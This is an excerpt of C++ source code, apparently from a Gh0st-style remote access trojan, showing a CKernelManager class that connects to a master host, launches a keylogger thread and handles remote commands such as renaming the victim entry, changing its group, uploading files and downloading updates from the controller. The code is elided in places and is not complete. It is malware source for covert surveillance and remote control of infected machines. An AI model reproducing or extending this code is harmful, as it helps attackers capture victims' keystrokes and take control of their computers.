...
CKernelManager::CKernelManager(CClientSocket *pClient,
                               LPCTSTR lpszMasterHost, UINT nMasterPort, DLLSERVER_INFO *dll_info) : CManager(pClient)
{
    m_DllInfo = dll_info;
    m_bIsActived = false;
...
CKernelManager::CKernelManager(CClientSocket *pClient, DLLSERVER_INFO* dll_info):CManager(pClient)
{
    m_DllInfo = dll_info;
    m_nThreadCount = 0;
}
...
{
    MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, m_DllInfo, 0,	NULL, true);
}
...
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    ...
    case COMMAND_RENAME_REMARK: // 改备注
        SetHostID(m_DllInfo->ServiceName, (LPCTSTR)(lpBuffer + 1));
        break;
    case COMMAND_CHANGE_GROUP:
        SetGroup(m_DllInfo->ServiceName, (LPCTSTR)(lpBuffer + 1));
        break;
    ...
    case COMMAND_LOCAL_UPLOAD:
        LocalLoad(lpBuffer, nSize, m_DllInfo->bisUnInstall);
        break;
    ...
    case COMMAND_DOWN_UPDATE: {
        UpdateServerParam* param = new UpdateServerParam{ lpBuffer + 1, m_DllInfo };
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UpdateServer,
                                      (LPVOID)param, 0, NULL, true);
    }
    break;
